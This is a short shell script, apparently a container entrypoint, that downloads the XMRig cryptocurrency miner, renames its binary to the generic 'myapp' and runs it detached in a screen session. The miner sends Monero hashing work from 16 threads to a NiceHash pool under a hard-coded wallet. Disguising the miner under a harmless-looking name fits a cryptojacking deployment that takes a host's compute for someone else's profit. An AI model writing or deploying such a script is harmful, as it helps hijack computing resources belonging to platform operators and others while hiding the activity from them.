#!/bin/sh

# Download the XMRig file
wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-noble-x64.tar.gz -O /app/xmrig-6.21.3-noble-x64.tar.gz

# Extract the XMRig file
tar -xvzf /app/xmrig-6.21.3-noble-x64.tar.gz -C /app/

# Clean up
rm /app/xmrig-6.21.3-noble-x64.tar.gz

# Rename the extracted XMRig binary to myapp
mv /app/xmrig-6.21.3/xmrig /app/xmrig-6.21.3/myapp

# Change directory to the extracted folder
cd /app/xmrig-6.21.3

# Run XMRig with screen
screen -dmS myapp_session sh -c "./myapp -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash --threads=16"

# Keep the container running
tail -f /dev/null
